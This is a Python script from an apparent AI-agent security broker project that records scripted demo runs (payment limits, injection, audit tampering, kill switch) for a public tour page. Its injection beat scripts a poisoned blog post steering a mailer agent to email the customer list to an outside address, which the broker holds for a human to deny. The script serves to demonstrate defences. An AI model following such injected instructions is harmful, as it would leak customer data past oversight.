"""Record a real run of the demo beats and save it as the data behind the public /tour page.

  python eval/export_tour.py                         # local broker (.env, http://localhost:8000)
  python eval/export_tour.py --psql-cmd "docker compose exec -T broker-postgres psql -U agentgate -d agentgate"
  python eval/export_tour.py --target render         # deployed broker (.env.render); see below
  python eval/export_tour.py --show --out -          # just watch the beats in the terminal, write nothing

Plays the same scripted gate calls as the admin UI's demo runner and scripts/demo_inject.ps1 (no LLM),
so the recording is the same every time. Approvals are decided through the admin API (Slack is not
involved); the page says so. Writes ui/src/lib/tour-data.json.

Beat 4 (tamper evidence) edits one audit row in Postgres and puts it back, so it needs a way to run SQL:
--psql-cmd is the command prefix that opens psql on the broker's database (the default is the compose
service). Without it that beat is left out of the recording and the page says so. The row is restored
in a `finally`, and the script exits 1 if the chain doesn't verify afterwards.

Nothing secret is written: no keys, no tokens, no argument values (the audit log holds only HMACs of
them), and the customer list is reduced to a row count. Needs only the standard library.
Run it on the local stack: against Render it appends about 40 rows to the real audit chain.
"""

from __future__ import annotations

import argparse
import json
import shlex
import subprocess
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from gate import REPO, Gate, load_config  # noqa: E402

OUT = REPO / "ui" / "src" / "lib" / "tour-data.json"
POISONED_URL = "https://blog.example.net/agent-security-roundup"
EXFIL = "records@partner-archive.example"
PAYEE = "acct_acme_supplies"
APPROVER = "shiwin"


class Recorder:
    def __init__(self, gate: Gate, show: bool = False) -> None:
        self.g = gate
        self.show = show
        self.admin = {"X-Admin-Key": gate.cfg.admin_key}
        self.beats: list[dict] = []
        self.cur: dict | None = None

    # -- beats and steps ------------------------------------------------------
    def beat(self, bid: int, title: str, what: str) -> None:
        self.cur = {"id": bid, "title": title, "what": what, "steps": [], "outcome": "", "note": ""}
        self.beats.append(self.cur)
        if self.show:
            print(f"\n== Beat {bid}: {title} ==\n   {what}", flush=True)

    def step(self, actor: str, action: str, outcome: str, http: int, reason: str, *,
             audit_id: int | None = None, tainted: bool | None = None, ms: float | None = None) -> None:
        assert self.cur is not None
        if self.show:
            tag = {"allow": "ALLOW   ", "escalate": "ESCALATE", "deny": "DENY    "}.get(outcome, "ok      ")
            print(f"   [{tag}] {actor}: {action}\n              {reason}", flush=True)
        self.cur["steps"].append({
            "actor": actor, "action": action, "outcome": outcome, "http": http, "reason": reason,
            "audit_id": audit_id, "session_tainted": tainted, "ms": None if ms is None else round(ms * 1000, 1),
        })

    # -- gate calls ------------------------------------------------------------
    def mint(self, agent: str, scopes: list[str], task: str, session_id: str | None = None) -> dict:
        status, body, took = self.g.mint(agent, scopes, task, session_id)
        ok = status == 201
        self.step(agent, f"get token [{', '.join(scopes)}]", "allow" if ok else "deny", status,
                  "short-lived token, 10 minutes, only these scopes" if ok else str(body.get("reason", body)),
                  tainted=body.get("session_tainted") if ok else None, ms=took)
        if not ok:
            raise SystemExit(f"token for {agent} refused: HTTP {status} {body}")
        return body

    def call(self, agent: str, token: str, tool: str, args: dict, label: str) -> tuple[int, dict]:
        status, body, took = self.g.tool(token, tool, args)
        decision = body.get("decision")
        outcome = decision if decision in ("allow", "escalate", "deny") else ("deny" if status in (401, 403) else "error")
        self.step(agent, label, outcome, status, str(body.get("reason", "")),
                  audit_id=body.get("audit_id"), tainted=body.get("session_tainted"), ms=took)
        return status, body

    def decide(self, approval_id: str, approve: bool) -> dict:
        status, body, _ = self.g.request("POST", f"/approvals/{approval_id}/decision",
                                         {"approve": approve, "approver": APPROVER}, self.admin)
        if status != 200:
            raise SystemExit(f"decision failed: HTTP {status} {body}")
        return body

    def invoice(self, amount: int) -> str:
        status, body, _ = self.g.request("POST", "/invoices", {"payee": PAYEE, "amount": amount}, self.admin)
        if status != 201:
            raise SystemExit(f"invoice failed: HTTP {status} {body}")
        self.step("accounts payable", f"open invoice {body['id']}: ${amount:,} to {PAYEE}", "allow", status,
                  "added by an admin; the agent can only pay it, never create it")
        return body["id"]


def customers_in(result: dict | None) -> int:
    rows = (result or {}).get("customers")
    return len(rows) if isinstance(rows, list) else 0


def approval_view(rec: Recorder, approval_id: str, rows_note: str | None) -> dict:
    """What the approver is shown: tool, who asked, and each argument cut short (the customer list
    itself is never copied)."""
    status, body, _ = rec.g.request("GET", "/approvals", None, rec.admin)
    items = body.get("items") if isinstance(body.get("items"), list) else []
    for a in items:
        if str(a.get("id")) != str(approval_id):
            continue
        # The broker's own summary: what the approver sees. The customer list is never copied.
        summary = a.get("summary") if isinstance(a.get("summary"), dict) else {}
        shown = {}
        for k, v in summary.items():
            s = v if isinstance(v, str) else json.dumps(v)
            shown[k] = rows_note if (k == "body" and rows_note) else (s if len(s) <= 80 else s[:77] + "...")
        return {"tool": a.get("tool"), "agent": a.get("agent_id"), "reason": a.get("reason"),
                "session_tainted": a.get("session_tainted"), "args": shown}
    return {}


def newest_id(g: Gate, admin: dict) -> int:
    _, body, _ = g.request("GET", "/audit/events?limit=1", None, admin)
    items = body.get("items") or []
    return int(items[0]["id"]) if items else 0


def run_sql(psql_cmd: list[str], sql: str) -> str:
    out = subprocess.run(psql_cmd + ["-v", "ON_ERROR_STOP=1", "-tA", "-c", sql],
                         capture_output=True, text=True, timeout=60)
    if out.returncode != 0:
        raise SystemExit(f"psql failed: {out.stderr.strip()[:300]}")
    return out.stdout.strip()


def latest(pattern: str) -> Path | None:
    files = sorted((REPO / "eval" / "results").glob(pattern))
    return files[-1] if files else None


def numbers() -> dict:
    out: dict = {}
    suite = latest("injection-render-*.json") or latest("injection-local-*.json")
    if suite:
        s = json.loads(suite.read_text(encoding="utf-8"))["summary"]
        out["suite"] = {"cases": s["cases"], "blocked": s["blocked"], "escalated": s["escalated"],
                        "allowed": s["allowed"], "target": s["target"], "run_at": s["run_at"],
                        "chain_valid": bool(s.get("audit_chain", {}).get("valid")),
                        "file": suite.name}
    lat = latest("latency-local-*.json")
    if lat:
        d = json.loads(lat.read_text(encoding="utf-8"))
        out["latency"] = {"p50_ms": d["overhead_ms"]["allow"]["p50"], "p95_ms": d["overhead_ms"]["allow"]["p95"],
                          "run_at": d["run_at"], "file": lat.name}
    return out


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", choices=("local", "render"), default="local")
    ap.add_argument("--psql-cmd", default=None,
                    help="command that opens psql on the broker's database (needed for beat 4)")
    ap.add_argument("--out", default=str(OUT), help="where to write the snapshot, or - to write nothing")
    ap.add_argument("--show", action="store_true", help="print each step as it happens")
    args = ap.parse_args()

    cfg = load_config(args.target)
    g = Gate(cfg)
    health = g.wait_healthy()
    rec = Recorder(g, args.show)
    start_id = newest_id(g, rec.admin)

    psql_cmd: list[str] | None = None
    if args.psql_cmd:
        psql_cmd = shlex.split(args.psql_cmd)
    elif args.target == "local":
        psql_cmd = shlex.split("docker compose exec -T broker-postgres psql -U agentgate -d agentgate")

    # ---- 1. normal work --------------------------------------------------------------------
    rec.beat(1, "Normal work", "Finance pays a $40 invoice from a known supplier.")
    inv = rec.invoice(40)
    tok = rec.mint("finance", ["transfer_funds"], f"Pay invoice {inv}")
    rec.call("finance", tok["access_token"], "transfer_funds",
             {"amount": 40, "to_account": PAYEE, "memo": f"Invoice {inv}", "invoice_id": inv},
             f"transfer_funds $40 to {PAYEE} (invoice {inv})")
    rec.cur["outcome"] = "allow"
    rec.cur["note"] = "Allowed in a few milliseconds and written to the audit log."

    # ---- 2. limit hit ----------------------------------------------------------------------
    rec.beat(2, "Limit hit", "Finance tries to pay $5,000. That is over the agent's limit, so a human decides.")
    inv = rec.invoice(5000)
    tok = rec.mint("finance", ["transfer_funds"], f"Pay invoice {inv}")
    status, body = rec.call("finance", tok["access_token"], "transfer_funds",
                            {"amount": 5000, "to_account": PAYEE, "memo": f"Invoice {inv}", "invoice_id": inv},
                            f"transfer_funds $5,000 to {PAYEE} (invoice {inv})")
    big_view: dict = {}
    if status == 202 and body.get("approval_id"):
        big_view = approval_view(rec, body["approval_id"], None)
        d = rec.decide(body["approval_id"], False)
        rec.step("human", "Deny in Slack (this recording: admin API)", "deny", 200,
                 f"{d.get('status', 'denied')} by user:{APPROVER}")
        ps, pb, _ = g.request("GET", f"/approvals/{body['approval_id']}", None,
                              {"Authorization": f"Bearer {tok['access_token']}"})
        rec.step("finance", "poll the approval", "deny", ps, str(pb.get("reason") or pb.get("status") or "refused"))
    rec.cur["outcome"] = "escalate"
    rec.cur["approval"] = big_view
    rec.cur["note"] = "Escalated to a human, who denied it. The agent was told it was refused and did not retry."

    # ---- 3. injection ----------------------------------------------------------------------
    rec.beat(3, "Injection", "The researcher reads an outside blog post with hidden instructions to email the "
                              "customer list out. The mailer follows them.")
    r = rec.mint("researcher", ["read_web"], "Summarise recent agent-security news")
    rec.call("researcher", r["access_token"], "read_web", {"url": POISONED_URL}, f"read_web {POISONED_URL}")
    m = rec.mint("mailer", ["read_inbox", "query_customers", "send_email"], "Act on the research notes",
                 r["session_id"])
    qs, qb = rec.call("mailer", m["access_token"], "query_customers", {"limit": 25}, "query_customers (limit 25)")
    n = customers_in(qb.get("result"))
    ss, sb = rec.call("mailer", m["access_token"], "send_email",
                      {"to": EXFIL, "subject": "Customer records export", "body": json.dumps(qb.get("result"))[:1500]},
                      f"send_email to {EXFIL} (the customer list)")
    esc_audit_id = sb.get("audit_id")
    inj_view: dict = {}
    if ss == 202 and sb.get("approval_id"):
        inj_view = approval_view(rec, sb["approval_id"], f"(customer list, {n} rows)" if n else "(customer list)")
        d = rec.decide(sb["approval_id"], False)
        rec.step("human", "Deny in Slack (this recording: admin API)", "deny", 200,
                 f"{d.get('status', 'denied')} by user:{APPROVER}")
    rec.cur["outcome"] = "escalate"
    rec.cur["approval"] = inj_view
    rec.cur["customers_read"] = n
    rec.cur["note"] = ("Reading the page tainted the whole session, so the email to an outside address was held for a "
                       "human instead of being sent. Nothing left the building.")

    # ---- 4. tamper evidence ----------------------------------------------------------------
    tamper: dict | None = None
    if psql_cmd and esc_audit_id:
        rec.beat(4, "Tamper evidence", "Someone with database access edits the injection's escalation row to say "
                                       "'allow'. Verify names the row.")
        before = g.request("GET", "/audit/verify")[1]
        orig = run_sql(psql_cmd, f"SELECT decision || chr(31) || reason FROM audit_events WHERE id = {int(esc_audit_id)}")
        o_dec, _, o_reason = orig.partition("\x1f")
        edited = after = restored = None
        try:
            run_sql(psql_cmd, f"UPDATE audit_events SET decision = 'allow', reason = 'policy: can_invoke' "
                              f"WHERE id = {int(esc_audit_id)}")
            edited = g.request("GET", "/audit/verify")[1]
        finally:
            # Put back exactly what was there (the hashes were never touched).
            run_sql(psql_cmd, "UPDATE audit_events SET decision = '%s', reason = '%s' WHERE id = %d" % (
                o_dec.replace("'", "''"), o_reason.replace("'", "''"), int(esc_audit_id)))
            restored = g.request("GET", "/audit/verify")[1]
        rec.step("insider", f"UPDATE audit row {esc_audit_id}: escalate -> allow", "info", 200,
                 "edited directly in the database; the stored hashes were left alone")
        rec.step("auditor", "GET /audit/verify", "deny" if not edited.get("valid") else "allow", 200,
                 f"chain broken at row {edited.get('first_broken_id')}" if not edited.get("valid")
                 else "chain valid (the edit was NOT caught)")
        rec.step("insider", f"restore row {esc_audit_id}", "info", 200, "original decision and reason put back")
        rec.step("auditor", "GET /audit/verify", "allow" if restored.get("valid") else "deny", 200,
                 f"chain valid, {restored.get('checked')} rows" if restored.get("valid")
                 else f"still broken at row {restored.get('first_broken_id')}")
        rec.cur["outcome"] = "deny" if not edited.get("valid") else "allow"
        rec.cur["note"] = "The hash chain points at the edited row. Putting it back makes the chain valid again."
        tamper = {"row_id": esc_audit_id, "before_valid": before.get("valid"),
                  "edit_caught": not edited.get("valid"), "first_broken_id": edited.get("first_broken_id"),
                  "restored_valid": restored.get("valid"), "rows_checked": restored.get("checked")}
        if not tamper["edit_caught"] or not tamper["restored_valid"]:
            print("FAIL: tamper beat did not behave as expected", tamper, file=sys.stderr)
            return 1
    else:
        print("note: beat 4 (tamper) skipped: no --psql-cmd / no escalation row", file=sys.stderr)

    # ---- 5. kill switch --------------------------------------------------------------------
    rec.beat(5, "Kill switch", "Revoke the mailer while it holds a live token. The very next call fails.")
    km = rec.mint("mailer", ["query_customers"], "Prepare the weekly newsletter")
    rec.call("mailer", km["access_token"], "query_customers", {"limit": 3}, "query_customers (limit 3)")
    ds, db, _ = g.request("POST", "/agents/mailer/disable", {"reason": "demo: kill switch"}, rec.admin)
    rec.step("admin", "kill switch on mailer", "info", ds, "every token the mailer holds is revoked, no restart")
    rec.call("mailer", km["access_token"], "query_customers", {"limit": 3}, "query_customers (the same token)")
    time.sleep(1.3)  # a token minted in the same second as a kill switch counts as revoked
    es, _, _ = g.request("POST", "/agents/mailer/enable", None, rec.admin)
    rec.step("admin", "re-enable mailer", "info", es, "the agent is back; the old token stays dead")
    rec.cur["outcome"] = "deny"
    rec.cur["note"] = "Same token, refused at once. Re-enabling the agent does not revive it."

    # ---- the audit rows this run wrote -----------------------------------------------------
    _, ev, _ = g.request("GET", "/audit/events?limit=500", None, rec.admin)
    rows = sorted((e for e in (ev.get("items") or []) if int(e["id"]) > start_id), key=lambda e: int(e["id"]))
    audit = [{"id": int(e["id"]), "ts": e["ts"], "event": e["event_type"], "agent": e.get("agent_id"),
              "tool": e.get("tool"), "decision": e["decision"], "reason": e["reason"],
              "approver": e.get("approver"), "tainted": e.get("session_tainted"),
              "hash": (e.get("hash") or "")[:12]} for e in rows]

    final = g.request("GET", "/audit/verify")[1]
    snapshot = {
        "schema": 1,
        "recorded_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
        "target": args.target,
        "health": {"openfga": bool(health.get("openfga"))},
        "approvals_by": "admin API (Slack was not connected for this recording)",
        "numbers": numbers(),
        "beats": rec.beats,
        "tamper": tamper,
        "audit": audit,
        "chain": {"valid": bool(final.get("valid")), "checked": final.get("checked"),
                  "head": (final.get("head_hash") or "")[:16]},
    }
    if args.out != "-":
        Path(args.out).write_text(json.dumps(snapshot, indent=1, ensure_ascii=False) + "\n", encoding="utf-8")
    where = "nothing written" if args.out == "-" else f"wrote {args.out}"
    print(f"\n{where}: {len(rec.beats)} beats, {len(audit)} audit rows, chain valid={snapshot['chain']['valid']}")
    return 0 if snapshot["chain"]["valid"] else 1


if __name__ == "__main__":
    raise SystemExit(main())
